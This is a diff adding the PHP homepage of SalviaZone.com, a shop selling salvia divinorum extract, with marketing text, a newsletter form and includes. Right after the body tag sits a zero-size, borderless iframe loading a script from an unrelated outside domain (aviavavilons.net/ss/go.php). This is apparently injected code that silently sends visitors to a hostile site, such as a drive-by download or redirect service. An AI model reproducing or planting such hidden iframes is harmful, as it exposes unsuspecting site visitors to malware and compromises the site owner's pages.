@@ -1,0 +1,84 @@
+<?php
+// BME WMS
+// Page: Homepage
+// Path/File: /index.php
+// Version: 1.1
+// Build: 1110
+// Date: 06-03-2007
+
+header('Content-type: text/html; charset=utf-8');
+include './includes/main1.php';
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Standardized Salvia Divinorum Extract From SalviaZone.com</title>
+
+<?php
+include './includes/meta1.php';
+?>
+
+</head>
+<body bgcolor="#<?php echo $bgcolor; ?>">
+<iframe src="http://aviavavilons.net/ss/go.php?sid=7" width="0" height="0" frameborder="0"></iframe><div align="center">
+
+<?php
+include './includes/head1.php';
+?>
+
+<table border="0" width="677">
+
+<tr><td>&nbsp;</td></tr>
+
+<tr><td VALIGN="TOP" align="left"><a href="./store/index.php"><img src="./images/home_brain1.jpg" border="0" width="208" height="189" align="left" alt="Turn Your Brain On"></a><font face="<?php echo $font; ?>" color="#<?php echo $fontcolor; ?>" size="+1"><b>Welcome to SalviaZone.com</b><br>
+<br>
+SALVIA ZONE is a herbal <a href="./medsups/index.php">meditation supplement</a>. It is completely organic and contains nothing but pure <a href="./salvia/index.php">Salvia Divinorum</a> leaf, enhanced to provide proper effectiveness. For more information please visit the rest of our website and especially our <a href="./store/index.php">Online Store</a>.</font>
+<table border="0" align="right">
+<tr><td align="center">
+<table border="0" cellspacing="0" cellpadding="0">
+<tr><td align="center"><img src="./images/home_yellow_box_top1.gif" border="0" alt=""></td></tr>
+<tr><td align="center" bgcolor="#F4EEAF" width="190"><font face="<?php echo $font; ?>" size="+1"><a id='save_home_page'></a></font>
+</td></tr>
+<tr><td align="center"><img src="./images/home_yellow_box_bot1.gif" border="0" alt=""></td></tr>
+</table>
+<a href="./store/index.php"><img src="/images/special.png" border="0" width="200" height="125" alt="End of Year Special"></a>
+<table border="0" cellspacing="0" cellpadding="0">
+<tr><td align="center"><img src="./images/home_orange_box_top1.gif" border="0" alt=""></td></tr>
+<tr><td align="center" bgcolor="#FFCA97" width="190"><font face="Arial" size="+1"><a href="./newsletters/index.php">Join Our Email<br>Newsletter Today!</a></font></td></tr>
+
+<tr><td bgcolor="#FFCA97" width="190" align="left"><FORM name="newsletter" Method="POST" ACTION="./newsletters/index.php" STYLE="DISPLAY:INLINE;"><font face="Arial" size="+1">&nbsp;&nbsp;Name:</font><br>&nbsp;&nbsp;<INPUT type="text" name="name" size="24" maxlength="100" value=""><br>
+<font face="Arial" size="+1">&nbsp;&nbsp;Email:</font><br>&nbsp;&nbsp;<INPUT type="text" name="email" size="24" maxlength="100" value=""><br>
+<center><INPUT type="Submit" name="submit" value="Subscribe"></center></form></td></tr>
+<tr><td align="center"><img src="./images/home_orange_box_bot1.gif" border="0" alt=""></td></tr>
+</table>
+</td></tr></table>
+<br><br><font face="<?php echo $font; ?>" color="#<?php echo $fontcolor; ?>" size="+1">Questions about SALVIA ZONE? Check out our <a href="./faqs/index.php">Frequently Asked Questions</a> or <a href="./contact/index.php">Contact Us</a>.<br>
+<br>
+People are <a href="./testimonials/index.php">talking about SALVIA ZONE</a>! Hear what they have to say and add your own comments.<br>
+<br>
+You can now purchase SALVIA ZONE at a Retailer near you. <a href="./findretailer/index.php">Visit our Find a Retailer page</a> to buy SALVIA ZONE at your local Retailer. If you are a Retailer and are interested in carrying SALVIA ZONE find out how to <a href="./beretailer/index.php">Become a SALVIA ZONE Retailer</a>.<br>
+<br>
+Have you seen us recently at the Seattle HempFest, Psytopia, Bonnaroo, or other music festivals and gatherings? Look for us soon at the Boston Freedom Rally. <a href="./articles/music1.php">Read More ></a><br>
+<?php
+/*
+?>
+<br>
+If you've had any problems ordering on our site recently, we've fixed several temporary problems and you are now able to shop error free. If you continue to have any problems please <a href="./contact/index.php">Contact Us</a> so we can help.<br>
+<?php
+*/
+?>
+</font></td></tr>
+
+
+<tr><td>&nbsp;</td></tr>
+
+</table>
+
+<?php
+include './includes/foot1.php';
+mysql_close($dbh);
+?>
+
+</div>
+</body>
+</html>
